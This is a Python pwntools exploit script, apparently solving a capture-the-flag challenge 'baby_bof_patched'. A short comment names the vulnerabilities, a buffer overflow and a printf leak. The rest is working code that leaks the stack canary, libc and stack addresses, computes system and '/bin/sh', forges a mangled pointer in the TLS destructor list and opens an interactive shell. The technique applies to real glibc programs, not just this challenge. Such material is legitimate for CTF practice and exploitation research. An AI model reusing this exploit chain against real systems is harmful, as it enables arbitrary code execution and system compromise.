from pwn import *

'''
RELRO           Full RELRO          
STACK CANARY    canary found   
NX              NX enabled         
PIE             PIE enabled     

vulnerabilities: 

    -1 buffer overflow (we cannot overwrite return address 
    due to the usage of clang safe stack) but usefull for 
    the exploitation part


    -2 leak primitive thanks to the successive calls to read and printf
    ("read" filled the src buffer until "\n", printf specifier 
    %s read until null byte)

exploitation: 
    - Playing with the overflow(1) we figure out that the program crash
    in __GI___call_tls_dtors. This function will try to call destructors present 
    TLS section. This section is located next to our fake stack :)

ressource: 
https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#5---code-execution-via-tls-storage-dtor_list-overwrite

'''
def write_me(res,datas):
    res.sendlineafter(b'>',b'1')
    res.sendlineafter(b'>',datas)

def leak_me2(res,datas):
    res.sendlineafter(b'>',b'1')
    res.sendlineafter(b'>',datas)

    leaked = res.recvuntil(b'I say : lmao')
    return leaked

def leak_me(res,datas):
    res.sendlineafter(b'>',b'1')
    res.sendlineafter(b'>',datas)

    leaked = res.recvuntil(b'I say : lmao')
    leaked_data= leaked.split(datas+b'\n')[1].split(b"\nI say")[0]
    return leaked_data

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))


r = process("./baby_bof_patched")
libc= ELF("./libc.so.6")
   
# leak canary
goto_canary = b'A'*72
fake_canary_leak = leak_me(r,goto_canary)
expected_fake_canary = b'\x00' +fake_canary_leak
canary_formated = u64(expected_fake_canary)
print("fake canary: ", hex(canary_formated))

# # now leak libc
goto_libc = b'B'*1767
libc_leak = leak_me(r,goto_libc)
libc_leaked = u64(libc_leak+b'\x00'*2)
print("libc leaked: ", hex(libc_leaked))

# now stack leak :
goto_stack = b'D'*1903
stack_leak = leak_me(r,goto_stack)
stack_leaked = u64(stack_leak+b'\x00'*2)
print("stack leaked: ", hex(stack_leaked))


# calculate libc base address
libc_system = (libc_leaked-0x187c60)
libc_base = libc_system - libc.symbols["system"]
libc_binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

libc_system = libc_base+libc.symbols["system"]
system_xor = rol(libc_system, 0x11,64)

final_payload=p64(system_xor)
final_payload+=p64(libc_binsh)
final_payload+=p64(0)*2
final_payload+=b'A'*40
final_payload+=p64(canary_formated) 
final_payload+=b'C'*1744
final_payload+=p64(stack_leaked)
final_payload+=p64(0)*9
final_payload+=p64(stack_leaked)
final_payload+=p64(stack_leaked+0x7fffb0)
final_payload+=p64(0x800000)
final_payload+=p64(0x1000)
final_payload+=p64(stack_leaked+0x790)
final_payload+=p64(stack_leaked+0x1130)
final_payload+=p64(stack_leaked+0x790)
final_payload+=p64(0)*4


# gdb.attach(r,gdbscript='''
# b* main+240
# b* main+332         
# ''')

write_me(r,final_payload)

sleep(0.4)
r.sendline(b'2')
r.interactive()
